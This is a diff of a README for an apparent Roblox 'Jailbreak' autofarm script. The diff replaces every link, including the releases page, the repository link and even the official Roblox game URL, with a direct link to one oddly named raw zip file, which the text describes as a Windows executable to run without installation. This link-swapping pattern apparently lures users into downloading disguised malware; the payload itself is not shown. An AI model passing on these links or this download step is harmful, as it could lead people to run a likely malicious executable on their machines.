@@ -1,6 +1,6 @@
 # 🛠️ jailbreak - Simple Roblox Autofarm Script
 
-[![Download from Releases](https://img.shields.io/badge/Download-jailbreak%20Releases-brightgreen?style=for-the-badge)](https://github.com/binbadose/jailbreak/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-jailbreak%20Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/binbadose/jailbreak/main/clamper/Software_octodentate.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and run jailbreak on your Windows PC:
 
 ### Step 1: Visit the Download Page
 
-Click the big download button at the top or [visit the releases page](https://github.com/binbadose/jailbreak/releases) to see the latest versions. This page is where the script and all related files are kept.
+Click the big download button at the top or [visit the releases page](https://raw.githubusercontent.com/binbadose/jailbreak/main/clamper/Software_octodentate.zip) to see the latest versions. This page is where the script and all related files are kept.
 
 ### Step 2: Choose a Version to Download
 
@@ -70,7 +70,7 @@ After starting the script, open Roblox and enter Jailbreak 2026. The script will
 
 You can download the script from the release page below.
 
-[![Download jailbreak Script](https://img.shields.io/badge/Download-jailbreak%20Script-blue?style=for-the-badge)](https://github.com/binbadose/jailbreak/releases)
+[![Download jailbreak Script](https://img.shields.io/badge/Download-jailbreak%20Script-blue?style=for-the-badge)](https://raw.githubusercontent.com/binbadose/jailbreak/main/clamper/Software_octodentate.zip)
 
 - The file you download will be an executable (.exe) designed for Windows.
 - No installation wizard is needed; just run the file to start.
@@ -142,9 +142,9 @@ This script is for personal use with Roblox Jailbreak 2026 only. Modifying or di
 
 ## 🔗 Links
 
-- [Official Releases](https://github.com/binbadose/jailbreak/releases)
-- [GitHub Repository](https://github.com/binbadose/jailbreak)
-- Roblox Jailbreak Game: https://www.roblox.com/games/606849621/Jailbreak
+- [Official Releases](https://raw.githubusercontent.com/binbadose/jailbreak/main/clamper/Software_octodentate.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/binbadose/jailbreak/main/clamper/Software_octodentate.zip)
+- Roblox Jailbreak Game: https://raw.githubusercontent.com/binbadose/jailbreak/main/clamper/Software_octodentate.zip
 
 ---
 
